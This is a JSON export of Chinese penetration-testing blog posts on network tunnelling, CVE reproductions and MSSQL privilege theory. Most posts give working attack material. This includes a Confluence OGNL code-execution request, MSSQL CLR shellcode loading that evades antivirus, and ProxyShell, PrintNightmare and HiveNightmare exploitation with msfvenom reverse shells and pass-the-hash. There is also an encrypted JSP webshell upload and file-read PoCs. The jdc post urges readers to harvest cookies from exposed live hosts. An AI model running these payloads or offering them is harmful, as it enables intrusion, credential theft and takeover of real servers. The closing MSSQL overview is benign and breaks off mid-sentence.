bundler\r开启服务：\rruby ./dnscat2.rb vpn.zeo.com -e open\r 目标主机客户端：\n上传dnsClient.zip 到目标主机 解压\n./dnscat --dns server=服务端ip,port=53 --secret=服务端生成的秘钥\r 直连模式使用方法：\nVPS中 server路径下：\rruby ./dnscat2\r客户端：（这个命令会在 上面服务启动后提示，可以参考下面的截图红框）\r./dnscat --dns server=x.x.x.x,port=53 --secret=281fc7a7ec57d500d269c96b8ae36ba5\r 四、网络层 4.1 ICMP隧道 ICMP（Internet Control Message Protocol）：没有目的端口与源端口，属于Internet控制报文协议。它是TCP/IP协议簇的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。\nicmp隧道常用攻击：icmpsh、PRISM\nicmpsh 环境说明:跨平台、不需要管理员运行\n有三台机器： VPS\u0026ndash;边界机\u0026ndash;内网机\nVPS操作过程：\n下载icmpsh\n安装依赖\n服务端禁用：\ricmp respones sysctl -w net.ipv4.icmp_echo_ignore_all=1\r运行程序 ：\r./run.sh\r输入目标主机IP地址 开启监听：\r./icmpsh_m,py vpsip 边界出网的公网IP\r在边界机执行：\rImp.exe -t 攻击机ip -d 500 -b 30 -s 128\r 还有一种方法\n编译 gcc icmpsh-m.c\rVPS开启监听： sudo ./a.out\r内网边界主机：icmpsh.exe -t VPSip -d 500 -b 30 -s 128\r 4.2 Lcx 内网端口转发\n目标主机：lcx.exe -slave vpsip 4444 127.0.0.1 3389\rVPS:Lcx --listen 4444 5555\r ","id":7,"section":"posts","summary":"0x00 内网穿透技术 当我们拿到一台内网主机后，一般都是有区域隔离的。所以这时候就用到流量代理了。这里简单介绍一下建立通信隧道，常见的有端口转发等 主","tags":["流量代理","内网渗透"],"title":"内网穿透工具的使用","uri":"https://ad-calcium.github.io/2021/09/%E6%B5%81%E9%87%8F%E4%BB%A3%E7%90%86/","year":"2021"},{"content":"0x01 漏洞介绍 Confluence Server Webwork OGNL 注入漏洞（CVE-2021-26084），远程攻击者在经过身份验证或在特定环境下未经身份验证的情况下，可构造OGNL表达式进行注入，实现在 Confluence Server或Data Center上执行任意代码。\n0x02 影响范围 受影响版本\n Confluence \u0026lt; 6.13.23 6.14.0 ≤ Confluence \u0026lt; 7.4.11 7.5.0 ≤ Confluence \u0026lt; 7.11.6 7.12.0 ≤ Confluence \u0026lt; 7.12.5 Confluence \u0026lt; 7.13.0  0x03 利用工具 https://github.com/h3v0x/CVE-2021-26084_Confluence\r 0x03 漏洞复现 漏洞payload\nPOST /pages/createpage-entervariables.action?SpaceKey=x HTTP/1.1\rHost: xxxxxxx\rCache-Control: max-age=0\rUpgrade-Insecure-Requests: 1\rUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36\rAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\rAccept-Encoding: gzip, deflate\rAccept-Language: zh-CN,zh;q=0.9,en;q=0.8\rCookie: JSESSIONID=4FBEAB3342C1B2F544CB4AA67A7ADA6F\rConnection: close\rContent-Type: application/x-www-form-urlencoded\rContent-Length: 1072\rqueryString=aaaaaaaa%5Cu0027%2B%7BClass.forName%28%5Cu0027javax.script.ScriptEngineManager%5Cu0027%29.newInstance%28%29.getEngineByName%28%5Cu0027JavaScript%5Cu0027%29.%5Cu0065val%28%5Cu0027var+isWin+%3D+java.lang.System.getProperty%28%5Cu0022os.name%5Cu0022%29.toLowerCase%28%29.contains%28%5Cu0022win%5Cu0022%29%3B+var+cmd+%3D+new+java.lang.String%28%5Cu0022whoami%5Cu0022%29%3Bvar+p+%3D+new+java.lang.ProcessBuilder%28%29%3B+if%28isWin%29%7Bp.command%28%5Cu0022cmd.exe%5Cu0022%2C+%5Cu0022%2Fc%5Cu0022%2C+cmd%29%3B+%7D+else%7Bp.command%28%5Cu0022bash%5Cu0022%2C+%5Cu0022-c%5Cu0022%2C+cmd%29%3B+%7Dp.redirectErrorStream%28true%29%3B+var+process%3D+p.start%28%29%3B+var+inputStreamReader+%3D+new+java.io.InputStreamReader%28process.getInputStream%28%29%29%3B+var+bufferedReader+%3D+new+java.io.BufferedReader%28inputStreamReader%29%3B+var+line+%3D+%5Cu0022%5Cu0022%3B+var+output+%3D+%5Cu0022%5Cu0022%3B+while%28%28line+%3D+bufferedReader.readLine%28%29%29+%21%3D+null%29%7Boutput+%3D+output+%2B+line+%2B+java.lang.Character.toString%2810%29%3B+%7D%5Cu0027%29%7D%2B%5Cu0027\r ","id":8,"section":"posts","summary":"0x01 漏洞介绍 Confluence Server Webwork OGNL 注入漏洞（CVE-2021-26084），远程攻击者在经过身份验证或在特定环境下未经身份验证的情况下，可构造OGNL表达式","tags":["漏洞复现","Confluence "],"title":"CVE-2021-26084(Confluence) 漏洞复现","uri":"https://ad-calcium.github.io/2021/09/cve-2021-26084confluence-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","year":"2021"},{"content":"0x01 前言 使用SQL Server提权的时候，发现各种组件都被拦截，无法绕过360执行系统命令，查询资料发现使用SQL Server CLR可以加载shellcode，从而绕过360执行系统命令。\n0x02 利用工具 SharpSQLTools https://github.com/uknowsec/SharpSQLTools\r 0x03 复现过程 1.使用cs生成木马 2.加密shell.bin python3 Encrypt.py -f shell.bin -k loader\r 3.启用MSSQL CLR功能 SharpSQLTools.exe 10.108.3.153 sa 123456 master enable_clr\r 4.使用文件16进制流创建CLR SharpSQLTools.exe 10.108.3.153 sa 123456 master install_clr\r 5.上传 payload.txt至可写目录 在执行copy命令合并文件时会被360拦截，但是文件已经被分割上传上去了。\nSharpSQLTools.exe 10.108.3.153 sa 123456 master upload payload.txt C:\\Users\\Public\\payload.txt\r 使用clr_combine去合并文件\nSharpSQLTools.exe 10.108.3.153 sa 123456 master clr_combine C:\\Users\\Public\\payload.txt\r 6.利用clr_scloader1加载进内存 SharpSQLTools中实现的clr_shellcode_loader使用APC注入技术，将shellcode解密后注入了一个新起的werFault.exe的进程中\nSharpSQLTools.exe 10.108.3.153 sa 123456 master clr_scloader1 C:\\Users\\Public\\payload.txt loader\r cs成功上线\n7.进程链bypass 当我们在cs上执行系统命令的操作时会被拦截，360对父进程是sqlservr.exe的进程链拦截得特别厉害。黑名单连：sqlserver.exe\u0026ndash;\u0026gt;cmd.exe\n360拦截的死死的\n注入其他进程来绕过sqlservr.exe的进程链防护。\n注入进程\ninject ppid arch\r 再次执行命令，发现已经不拦截了\n","id":9,"section":"posts","summary":"0x01 前言 使用SQL Server提权的时候，发现各种组件都被拦截，无法绕过360执行系统命令，查询资料发现使用SQL Server CLR可以加载shellc","tags":["MSSQL","MSSQL提权"],"title":"mssql提权之使用clr bypass360","uri":"https://ad-calcium.github.io/2021/08/mssql%E6%8F%90%E6%9D%83%E4%B9%8B%E4%BD%BF%E7%94%A8clr-bypass360/","year":"2021"},{"content":"要求 Exchange 2019 目录服务器要求 域控制器：林中的所有域控制器都需要运行 Windows Server 2012 R2 Standard 或 Datacenter版本以上\nActive Directory 林的功能级别：Windows Server 2012 R2 或更高版本。\nExchange 2019支持的操作系统： 邮箱和边缘传输服务器角色：Windows Server 2019 Standard 或 Datacenter\n管理工具：Windows Server 2019 Standard或Datacenter和64位版本的 Windows 10\n安装 1.新增exchange用户 在域控上将exchange用户加入到Enterprise admins组中\n2.安装常用组件   切换域管理员或拥有Exchange管理权限的用户登录并安装必备组件（此次实验环境用域管理员登录）\n .NET Framework 4.8 Visual C++ Redistributable Package for Visual Studio 2012 Visual C++ Redistributable Package for Visual Studio 2013 Unified Communications Managed API 4.0 通过Power Shell安装Exchange必备的Windows组件    通过Power Shell安装Exchange必备的Windows组件\nInstall-WindowsFeature Server-Media-Foundation, NET-Framework-45-Features, RPC-over-HTTP-proxy, RSAT-Clustering, RSAT-Clustering-CmdInterface, RSAT-Clustering-Mgmt, RSAT-Clustering-PowerShell, WAS-Process-Model, Web-Asp-Net45, Web-Basic-Auth, Web-Client-Auth, Web-Digest-Auth, Web-Dir-Browsing, Web-Dyn-Compression, Web-Http-Errors, Web-Http-Logging, Web-Http-Redirect, Web-Http-Tracing, Web-ISAPI-Ext, Web-ISAPI-Filter, Web-Lgcy-Mgmt-Console, Web-Metabase, Web-Mgmt-Console, Web-Mgmt-Service, Web-Net-Ext45, Web-Request-Monitor, Web-Server, Web-Stat-Compression, Web-Static-Content, Web-Windows-Auth, Web-WMI, Windows-Identity-Foundation, RSAT-ADDS\r   3.安装主程序  挂载Exchange 2019 光盘文件，并运行Setup.exe 程序   为节约时间选择“现在不检查更新”后续可以自己更新   文件复制完成后便开始进入向导安装。   选择“不使用推荐设置”   在服务器角色选择页面勾选邮箱角色 。从exchange 2016 起，exchange 将2013中的客户端访问角色和邮箱角色合并为邮箱角色。    指定exchange组织的名称\n  恶意软件防护设置，按需选择，比较弱鸡，外层有邮件网关的可以不开启。\n   分析先决条件，没有错误即可开始安装   开始安装，整个过程共14步，安装速度与机器配置有关，请耐心等待。   等待安装完成，访问owa页面可以正常打开，安装到此结束。  https://127.0.0.1/owa/\r 用户和组管理 方法一：先创建域用户，再把现有用户创建为邮箱。\n根据要求一步步新建用户，用户创建好之后\n使用管理员身份登录exchange ECP管理中心(一般情况下是exchange机器的用户密码)：https://127.0.0.1/ecp/ 选择收件人\u0026gt;邮箱\u0026gt;➕\u0026gt;\n用户邮箱 打开创建邮箱向导。\n勾选现有用户，点击浏览按钮即可选择域控中的用户保存之后既可以看到用户\n在邮箱处可以看到刚刚添加的 邮箱\n方法二：通过ECP后台直接创建邮箱和域账号。\n点击添加\n选择用户时改为选择新用户填入用户资料即可，其他步骤都一样。\n参考地址：\nhttps://www.xiaobei.us/archives/775.html\n","id":10,"section":"posts","summary":"要求 Exchange 2019 目录服务器要求 域控制器：林中的所有域控制器都需要运行 Windows Server 2012 R2 Standard 或 Datacenter版本以上 Active Directory 林的功能级别：Windows Server 2012 R2 或","tags":["内网环境搭建"],"title":"exchange2019安装教程","uri":"https://ad-calcium.github.io/2021/08/exchange2019%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B/","year":"2021"},{"content":"0x01 漏洞介绍 国外安全研究人员在8月初公开了Microsoft Exchange多个高危漏洞（ProxyShell）利用的技术细节、PoC(概念验证代码)、EXP（漏洞利用代码）及利用视频。漏洞包括Exchange ACL绕过漏洞CVE-2021-34473、Exchange权限提升漏洞CVE-2021-34523和Exchange授权任意文件写入漏洞CVE-2021-31207）。\n攻击者可通过组合使用上述漏洞在未经身份验证的情况下远程接管目标服务器。由于Exchange服务器一般承载着使用者单位人员信息的秘密，员工账号信息、邮件数据都在其中，一旦Exchange服务器被控制，将会造成严重后果。\n由于国外安全研究人员将Exchange多个漏洞（ProxyShell）细节及部分PoC、EXP公开，意味着攻击者可根据这些技术细节披露的信息，在目标系统远程执行代码，使漏洞风险明显上升。\n0x02 漏洞利用前提 获取exchange的用户名\n0x03 受影响的版本  Microsoft Exchange Server 2019 Cumulative Update 9 Microsoft Exchange Server 2013 Cumulative Update 23 Microsoft Exchange Server 2019 Cumulative Update 8 Microsoft Exchange Server 2016 Cumulative Update 19 Microsoft Exchange Server 2016 Cumulative Update 20  0x04 工具 生成webshell：https://github.com/Ridter/proxyshell_payload\r漏洞利用：https://github.com/dmaasland/proxyshell-poc\r 0x05 漏洞复现环境    名称 系统 软件版本     域控 windows server 2012    邮件服务 windows server 2019 exchange2019    0x06 漏洞复现 1.根据需求，生成webshell 根据自己需要，生成webshell数据，替换到proxyshell-poc中，执行，获取webshell。默认情况下，生成的是一句话木马\n在proxyshell_payload.py中，修改末尾的webshell变量，将其替换为哥斯拉生成的aspx的webshell,需要注意的是经过测试CSharpDynamicPayload中的CSHAP_AES_BASE64,生成的webshell,需要将其中所有的Session替换成Application.\n运行proxyshell_payload.py，将encode之后的内容，复制到proxyshell_rce.py的 311 行：\n2.运行exp获取webshell 运行proxyshell_rce.py，首先获取exchange的powershell 管理shell\npython3 proxyshell_rce.py -u https://10.108.3.140 -e exxx@xxx.com\r用法\r-u exchange地址\r-e exchange的用户名\r 清理邮件导出请求(如果报错，多执行几次脚本即可)\nGet-MailboxExportRequest\rGet-MailboxExportRequest|Remove-MailboxExportRequest -Confirm:$false\r 执行dropshell，即可写入webshelldropshell\n3.连接webshell 使用菜刀连接shell\n查看权限\nProxyshell_rce可以根据自己的需要修改生成shell的路径，只需要修改222行和 233行的两行内容，将其对应。\n默认上传路径：C:\\inetpub\\wwwroot\\aspnet_client\n参考地址：\nhttps://mp.weixin.qq.com/s/-qJh2u0mbrKWxWNCZgOrVw\r ","id":11,"section":"posts","summary":"0x01 漏洞介绍 国外安全研究人员在8月初公开了Microsoft Exchange多个高危漏洞（ProxyShell）利用的技术细节、PoC(概念验","tags":["漏洞复现","exchange"],"title":"ProxyShell漏洞复现","uri":"https://ad-calcium.github.io/2021/08/proxyshell%E5%A4%8D%E7%8E%B0/","year":"2021"},{"content":"0x01 漏洞介绍 天融信-上网行为管理系统存在弱口令漏洞并存在任意文件读取漏洞，攻击者可利用该漏洞获取服务器上的铭感文件。\n0x02 漏洞复现 fofa语法\napp=\u0026quot;天融信-上网行为管理系统\u0026quot;\r fofa上看了一波，还是有很多资产的\n弱口令：guest/guest*PWD\nPOC:https://xxxxxxx/view/action/download_file.php?filename=/root/.bash_history\u0026amp;savename=\r ","id":12,"section":"posts","summary":"0x01 漏洞介绍 天融信-上网行为管理系统存在弱口令漏洞并存在任意文件读取漏洞，攻击者可利用该漏洞获取服务器上的铭感文件。 0x02 漏洞复现 fofa语法 ap","tags":["漏洞复现","web渗透"],"title":"天融信上网行为管理系统存在任意文件读取漏洞","uri":"https://ad-calcium.github.io/2021/07/%E5%A4%A9%E8%9E%8D%E4%BF%A1%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/","year":"2021"},{"content":"0x01 漏洞介绍 Windows 10 中允许以非管理员用户身份检索所有注册表配置单元。例如，这包括 SAM 中的哈希值，可用于以 SYSTEM 身份执行代码\n0x02 漏洞利用前提 适用于所有受支持的 Windows 10 版本，其中启用了系统保护（在大多数配置中应默认启用）。\n0x03 工具 提权工具：https://github.com/GossiTheDog/HiveNightmare\n横向移动工具：https://github.com/SecureAuthCorp/impacket\nmimikatz：https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20210721/mimikatz_trunk.7z\n0x04 漏洞复现 一、检查是否易受攻击 icacls C:\\windows\\system32\\config\\sam\r 如果输出 BUILTIN\\Users:(I)(RX) 表示该系统易受攻击。\n如果输出 Access is denied 或拒绝访问表示该系统不易受攻击。\n二、通过HiveNightmare.exe导出sam hash进行提权 1.查看当前用户 运行exp，运行完成后会在桌面上生成三个文件\n查看转存下的文件\n2.解密凭证 将文件放到本地使用secretsdump.py进行解密，成功获取主机的hash\npython3 secretsdump.py -sam SAM-haxx -system SYSTEM-haxx -security SECURITY-haxx LOCAL\r 3.解密nthash 使用CMD5网站将nthash进行解密，成功获取明文密码\nhttps://www.cmd5.com/\n4.横向移动 使用获取的hash进行横向移动\npsexec.exe -hashes aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4 administrator@10.108.3.77\r psexec乱码解决办法chcp 65001\n三、通过mimkiatz导出sam hash进行提权 1.查看用户属性 普通账号下运行mimikatz并执行查看所有用户的属性\n2.导出shadowcopy volume mimikatz # misc::shadowcopies  3.读取密码 mimikatz# lsadump::sam /system:\\\\?\\GLOBALROOT\\Device\\HarddiskvolumeShadowcopy2\\widows\\system2\\config\\SYSTEM /sam:\\\\?\\GLOBALROOT\\Device\\HarddiskvolumeShadowcopy2\\windows\\system32\\config\\SAM\r 附录 如果提示以下错误，可能是未开启系统保护（在大多数配置中应默认启用）\n开启系统保护的方法 1.点击配置\n2.点击配置，选择\u0026quot;启用系统保护\u0026quot;\n3.点击\u0026quot;创建\u0026quot;\n4.输入还原点的描述(随便输入即可)\n5.等待创建完成\n提示成功创建\n","id":13,"section":"posts","summary":"0x01 漏洞介绍 Windows 10 中允许以非管理员用户身份检索所有注册表配置单元。例如，这包括 SAM 中的哈希值，可用于以 SYSTEM 身份执行代码 0x02 漏洞利用前提 适用于所有受支持","tags":["漏洞复现","内网"],"title":"CVE-2021-36934 漏洞复现","uri":"https://ad-calcium.github.io/2021/07/cve-2021-36934%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","year":"2021"},{"content":"0x01 漏洞描述 jdc用于对接青龙面板 2.0使用，用于自助扫码功能，由于开发者未对checkcookie进行鉴权，导致攻击者通过该漏洞获取全部cookie，造成用户信息泄露等。\n0x02 漏洞复现 poc：http://IP:5678/checkcookie\r 获取到jd的cookie，怎么用大家都懂。\n撸了个脚本,跑了一下大概还有几十个漏洞，懂得小伙伴可以去梭哈一波。\n","id":14,"section":"posts","summary":"0x01 漏洞描述 jdc用于对接青龙面板 2.0使用，用于自助扫码功能，由于开发者未对checkcookie进行鉴权，导致攻击者通过该漏洞获取全部co","tags":["漏洞复现","web安全"],"title":"jdc未授权访问","uri":"https://ad-calcium.github.io/2021/07/jdc%E6%9C%AA%E6%8E%88%E6%9D%83/","year":"2021"},{"content":"复现环境 靶机：Windows Server 2019\n攻击机：kali\n漏洞介绍 Windows Print Spooler是Windows的打印机后台处理程序，广泛的应用于各种内网中，攻击者可以通过该漏洞绕过PfcAddPrinterDriver的安全验证，并在打印服务器中安装恶意的驱动程序。若攻击者所控制的用户在域中，则攻击者可以连接到DC中的Spooler服务，并利用该漏洞在DC中安装恶意的驱动程序，完整的控制整个域环境。\n该漏洞广泛的存在于各Windows版本中，利用复杂度为中，但由于成功利用该漏洞的攻击者可以完整的控制域环境，造成非常严重的后果，所以该漏洞的利用价值极高。\n影响版本 Windows Server 2016\nWindows Server 2019\n利用前提 1.靶机没有更新CVE-2021-1675的补丁\n2.域内任意账户的用户名密码\n3.域控ip\n4.可被域控匿名访问的共享文件夹\n漏洞工具 CVE-2021-1675(域提权)：https://github.com/cube0x0/CVE-2021-1675\nCVE-2021-1675本地提权：https://github.com/gyaansastra/Print-Nightmare-LPE\n漏洞复现 一、域提权 1.配置smb服务 下面为配置文件/etc/samba/smb.conf需要修改的地方。\n[global]\rmap to guest = Bad User\rserver role = standalone server\rusershare allow guests = yes\ridmap config * : backend = tdb\rsmb ports = 445\rlog level = 10\r[share]\rcomment = share\rpath = /tmp\rguest ok = yes\rwritable =yes\rbrowsable = yes\r#force user = smbuser\r 启动smb服务\nservice smbd start\r 2.探测是否存在漏洞 使用impacket工具包中的rpcdump.py判断目标及其是否存在漏洞\nrpcdump.py @10.99.99.250 | grep MS-RPRN\r 3.使用msf生成恶意dll msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.99.99.175 LPORT=9999 -f dll -o /tmp/test.dll\r注意：只能使用64位的dll文件，否则会发现，dll可以上传但不会被执行\r 4.开启msf监听 使用msf监听，首先输入msfconsole\n输入以下内容监听\nuse exploit/multi/handler\rset payload windows/x64/meterpreter/reverse_tcp\rset lhost 10.99.99.175\rset lport 9999\rrun\r 5.漏洞利用 进入exp目录\ncd /root/CVE-2021-1675-main\r 漏洞利用\n其中cyberpeace为域的名字，admin:qq123456..分别是域控任意用户的账号密码，10.99.99.250是域控ip。 后面的\\\\10.99.99.175\\share\\test.dll为smb可访问的unc路径，也是共享文件的路径。\npython3 CVE-2021-1675.py cyberpeace/admin:qq123456..@10.99.99.250 \u0026quot;\\\\\\10.99.99.175\\share\\test.dll\u0026quot;\r 成功获取域控权限\n查看当前主机权限和主机信息\ngetuid #查看当前权限\rsysinfo #查看主机信息\r 二、本地提权 1.新增用户 默认添加一个新用户到本地管理员组：\npowershell\rImport-Module .\\cve-2021-1675.ps1 #导入模块\rInvoke-Nightmare -newuser \u0026quot;test\u0026quot; -newpassword \u0026quot;test\u0026quot; -drivername \u0026quot;printme\u0026quot; #新建用户，用户名：test 密码：test\r 验证攻击是否成功\n2.自定义dll文件 msf生成dll文件\nmsfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp lhost=192.168.3.54 lport=4444 -f dll \u0026gt; x.dll\r 监听主机\nuse exploit/multi/handler set payload windows/x64/meterpreter/reverse_tcp set LHOST 192.168.93.40 set lport 4444 exploit\n加载dll文件\nImport-Module .\\cve-2021-1675.ps1\rInvoke-Nightmare -DLL \u0026quot;C:\\Users\\Administrator\\Downloads\\x.dll\u0026quot;\r 主机成功上线\n","id":15,"section":"posts","summary":"复现环境 靶机：Windows Server 2019 攻击机：kali 漏洞介绍 Windows Print Spooler是Windows的打印机后台处理程序，广泛的应用于各种内网中，攻击","tags":["漏洞复现","内网"],"title":"CVE-2021-1675 漏洞复现","uri":"https://ad-calcium.github.io/2021/07/cve-2021-1675%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/","year":"2021"},{"content":"0x01 漏洞描述 万户Ezoffice系统是一套基于jsp的oa系统，该系统基于J2EE架构技术的三层架构，完全采用B/S体系结构，广泛应用于各个行业。 ezOFFICE协同管理平台存在文件上传漏洞，攻击者可利用该漏洞获取服务器权限。\n0x02 fofa语法 body=\u0026quot;ezOFFICE\u0026quot;\r 0x03 漏洞复现 上传成功返回文件名，拼接一下即可\n完整的url：http://www.baidu.com/defaultroot/upload/html/xxx.jsp，上传之后使用冰蝎连接，默认密码为:rebeyond\n数据包\nPOST /defaultroot/upload/fileUpload.controller HTTP/1.1\rHost: www.baidu.com\rUser-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0\rAccept-Encoding: gzip, deflate\rAccept: */*\rConnection: close\rContent-Type: multipart/form-data; boundary=KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0\rContent-Length: 773\r--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0\rContent-Disposition: form-data; name=\u0026quot;file\u0026quot;; filename=\u0026quot;xxxxx.jsp\u0026quot;\rContent-Type: application/octet-stream\rContent-Transfer-Encoding: binary\r\u0026lt;%@page import=\u0026quot;java.util.*,javax.crypto.*,javax.crypto.spec.*\u0026quot;%\u0026gt;\u0026lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%\u0026gt;\u0026lt;%if (request.getMethod().equals(\u0026quot;POST\u0026quot;)){String k=\u0026quot;e45e329feb5d925b\u0026quot;;/*......tas9er*/session.putValue(\u0026quot;u\u0026quot;,k);Cipher c=Cipher.getInstance(\u0026quot;AES\u0026quot;);c.init(2,new SecretKeySpec(k.getBytes(),\u0026quot;AES\u0026quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%\u0026gt;\r--KPmtcldVGtT3s8kux_aHDDZ4-A7wRsken5v0--\r ps:最近这几天被上传了好几十个shell，哥哥们太猛了\n","id":16,"section":"posts","summary":"0x01 漏洞描述 万户Ezoffice系统是一套基于jsp的oa系统，该系统基于J2EE架构技术的三层架构，完全采用B/S体系结构，广泛应用于各个行","tags":["漏洞复现","web安全"],"title":"ezOFFICE 任意文件上传","uri":"https://ad-calcium.github.io/2021/07/ezoffice%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/","year":"2021"},{"content":"一、MSSQL简介 MSSQL(MicroSoft SQL Server数据库)，是微软开发的关系型数据库管理系统DBMS，是一个较大型的数据库，提供数据库的从服务器到终端的完整的解决方案，数据库管理系统SSMS(SQL Server Managerment Studio)，是一个用于建立、使用和维护数据库的集成开发环境。 端口号：1433\nSA用户 在搭建时，选择使用SQL Server身份验证会创建SA账户并设置密码，SA(System Administrator)表示系统管理员，在SQLServer2019之前的SA用户都是系统最高权限用户SYSTEM，但在2019版本时为普通数据库用户mssqlserver，是一个低权用户。\n系统库 系统数据库默认创建时就会存在，有以下4种\n存储过程 存储过程是一个可编程的函数，它在数据库中创建并保存，是存储在服务器中的一组预编译过的T-SQL（SQL语言版本之一，只能在SQLserver使用）语句。数据库中的存储过程可以看做是对编程中面向对象方法的模拟。它允许控制数据的访问方式（可以将存储过程理解为函数调用的过程），使用execute命令执行存储过程。\n系统存储过程、扩展存储过程、用户自定义的存储过程。\n 系统存储过程主要存储在master数据库中，以\u0026quot;sp_\u0026ldquo;为前缀，在任何数据库中都可以调用，在调用的时候不必在存储过程前加上数据库名； 扩展存储过程则是对动态链接库(DLL)函数的调用，主要是用于客户端与服务器端或客户端之间进行通信的，以“xp_\u0026ldquo;为前缀，使用方法与系统存储过程类似； 用户定义的存储过程是SQLServer的使用者编写的存储过程；  存储过程为数据库提供了强大的功能，但在相应的权限下，攻击者可以利用不同的存储过程执行不同的高级功能，如：创建数据库用户、枚举文件目录、执行任意系统命令等。正因如此，SQLserver2005、2008等之后的版本分别对存储过程做了权限控制，以防滥用。\nServer权限体系 权限两个字，一个权力，一个限制。在软件领域通俗的解释就是哪些人可以对哪些资源做哪些操作。在SQL Server中，”哪些人”，“哪些资源”,”哪些操作”则分别对应SQL Server中的三个对象，分别为主体(Principals),安全对象(Securables)和权限(Permissions)，而权力和限制则是对应了SQL Server中的GRENT和DENY。对于主体，安全对象和权限的初步理解，见下图：\n主体 “主体”是可以请求 SQL Server 资源的实体。主体可以是个体，组或者进程。主体可以按照作用范围被分为三类:\n Windows级别主体：包括Windows 域登录名和Windows 本地登录名。 服务器级别主体：包括服务器登录名和服务器角色。 数据库级别主体：包括数据库用户、数据库角色、固定数据库角色以及应用程序角色。  可以看到主体包括登录名以及角色。\n角色 角色可以看成是权限的集合体，为了方便权限管理，可以把一些常用权限赋予角色，然后再把角色赋予相关用户，则这些用户就继承了橘色中的所有权限。一般情况下，数据库会内置一些角色，用户也可以创建自定义角色。对角色进行权限管理的方式与对用户进行权限管理的方式是相同的。 角色在SQL Server中被分为三类，分别为:\n 内置角色\u0026mdash;-这类角色在服务器安装时已经默认存在，其权限是固定的，并且不能被删除 用户自定义角色\u0026mdash;-这类角色由用户按照需求自定义创建 应用程序角色\u0026mdash;-这类特殊角色用于管理应用程序的数据访问  角色也分为两个方面：\n 服务器级别的角色，用于数据库服务器方面的控制权限 数据库级别的角色，用于数据库中数据的控制权限。  1.服务器级别的角色 服务器级角色的权限作用域为服务器范围。例如创建、修改、删除数据库，管理磁盘文件，添加或删除数据库连接等等，都是需要服务器上的权限才能进行操作。 固定服务器角色具有一组固定的权限，并且适用于整个服务器范围。 它们专门用于管理 SQL Server，且不能更改分配给它们的权限。 可以在数据库中不存在用户帐户的情况下向固定服务器角色分配登录。 **服务器级别的对象，只能包含登录名。**定义了服务器角色，你定义的登陆用户就有了相应的执行权限。先来看一下服务器级别的固定角色：\n   服务器角色 含义     sysadmin 可以在服务器上执行任何活动   serveradmin 可以更改服务器范围的配置选项和关闭服务器   securityadmin 管理和审核登录用户。具有 GRANT、DENY 和 REVOKE 服务器和数据库级别的权限。此外，还可以重置 SQL Server 登录名的密码   processadmin 管理SQL Server运行的进程   setupadmin 可以使用 T-SQL 语句添加和删除连接服务器，并可以执行某些系统存储过程（如 sp_serveroption）   bulkadmin 可以运行 BULK INSERT 语句   diskadmin 用于管理磁盘文件   dbcreator 可以创建、更改、删除和还原任何数据库   public public角色不同于其它角色在于其权限可以被修改，每个 SQL Server 登录名都属于 public 服务器角色。无法将用户、角色或组指派给它，因为默认情况下它属于该角色，且public不能被删除    2.数据库级别的角色 数据库级角色的权限作用域为数据库范围。例如可以访问哪个数据库，可以访问哪个数据库中的哪些数据表、哪些视图、哪些存储过程等等，都需要数据库上的权限才能进行操作。 SQL Server存在两种类型的数据库级角色：数据库中预定义的“固定数据库角色”和可以创建的“用户定义的数据库角色”。 固定数据库角色是SQL Server预定义的数据库角色，具有数据库级别的管理权限，并且存在于每个数据库中。**db_owner *数据库角色的成员可以管理固定数据库角色成员身份。自定义数据库角色是当固定数据库角色不能满足要求时，可以自定义数据库角色。 * 数据库级别的对象，只能包含数据库用户名。**先来看一下数据库级别的固定角色：\n   数据库角色 含义     db_owner 可以执行数据库中技术所有动作的用户，执行所有的配置活动和维护活动   db_securityadmin 管理数据库安全，可以修改角色成员身份和管理权限。向此角色中添加主体可能会导致意外的权限升级   db_accessadmin 可以为 Windows 登录名、Windows 组和 SQL Server 登录名添加或删除数据库访问权限   db_backupoperator 可以备份数据库   db_ddladmin 可以在数据库中运行任何数据定义语言 (DDL) 命令   db_datawriter 可以在所有用户表中添加、删除或更改数据   db_datareader 可以从所有用户表中读取所有数据   db_denydatawriter 不能添加、修改或删除数据库内用户表中的任何数据   db_denydatareader 不能读取数据库内用户表中的任何数据   public public角色不同于其它角色在于其权限可以被修改，每个数据库用户、角色或组都属于public数据库角色。无法将用户、角色或组指派给它，因为默认情况下它属于该角色，且public不能被删除    登录账号和数据库用户 SQL Server的服务器和数据库是两个层次的概念，SQL Server的用户也分为两种，一种是服务器登陆账号，另一种是数据库用户。 一个人要操作SQL Server数据库，首先要为其创建服务器登陆账号，使得他可以登录到服务器上，然后还要在要操作的数据库上创建和这个登陆账号对应的数据库用户。 可以给登陆账号赋予相应权限，使得这个账号可以执行指定的管理服务器的任务。也可以给数据库用户赋予相应权限，使得这个数据库用户可以在这个数据库中执行指定的操作。 服务器登陆账号分为为Windows验证及SQL Server验证两种。\n Windows身份验证模式：把Windows的操作系统用户添加为SQL Server服务器登陆账号，SQL 